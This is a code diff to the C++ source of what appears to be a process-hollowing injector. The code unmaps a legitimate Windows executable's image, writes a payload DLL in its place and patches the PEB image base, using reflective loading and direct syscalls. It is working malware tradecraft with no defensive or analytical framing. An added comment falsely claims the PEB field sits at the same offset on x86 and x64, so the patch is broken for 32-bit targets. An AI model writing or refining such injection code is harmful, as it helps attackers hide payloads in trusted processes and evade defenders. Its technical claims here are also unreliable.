@@ -1,9 +1,15 @@
 #include "hollower.hpp"
 #include "reflective_loader.hpp"
+#include "../utils/syscalls.hpp"
+#include "../utils/nt_defs.hpp"
 #include <windows.h>
 #include <winternl.h>
 
 namespace l4g::injection {
+
+// PEB.ImageBaseAddress sits at +0x10 on both x86 and x64; the SDK's truncated
+// _PEB does not name it, so read it by offset instead of defining a fake PEB.
+static constexpr SIZE_T kPebImageBaseAddressOffset = 0x10;
 
 HollowResult ProcessHollower::hollow_and_inject(const std::wstring& target_exe, const std::vector<uint8_t>& payload_dll, void* param) {
     HollowResult result;
@@ -92,16 +98,19 @@ bool ProcessHollower::unmap_original_image(HANDLE process) {
         return false;
     }
     
-    // Read PEB
-    PEB peb = {};
+    // Read PEB.ImageBaseAddress by offset
+    PVOID image_base = nullptr;
     SIZE_T read = 0;
-    if (!ReadProcessMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &read) || read != sizeof(peb)) {
+    if (!ReadProcessMemory(process,
+                           (const BYTE*)pbi.PebBaseAddress + kPebImageBaseAddressOffset,
+                           &image_base, sizeof(image_base), &read) ||
+        read != sizeof(image_base)) {
         return false;
     }
-    
+
     // Unmap the original image
-    if (peb.ImageBaseAddress) {
-        return NT_SUCCESS(sys.NtUnmapViewOfSection(process, peb.ImageBaseAddress));
+    if (image_base) {
+        return NT_SUCCESS(sys.NtUnmapViewOfSection(process, image_base));
     }
     return true;
 }
@@ -127,7 +136,8 @@ bool ProcessHollower::fix_entry_point(HANDLE process, void* base, const std::vec
     
     // Write new ImageBaseAddress
     SIZE_T written = 0;
-    return WriteProcessMemory(process, &((PPEB)pbi.PebBaseAddress)->ImageBaseAddress, &base, sizeof(base), &written) && written == sizeof(base);
+    void* slot = (BYTE*)pbi.PebBaseAddress + kPebImageBaseAddressOffset;
+    return WriteProcessMemory(process, slot, &base, sizeof(base), &written) && written == sizeof(base);
 }
 
 bool ProcessHollower::resume_thread(HANDLE thread) {
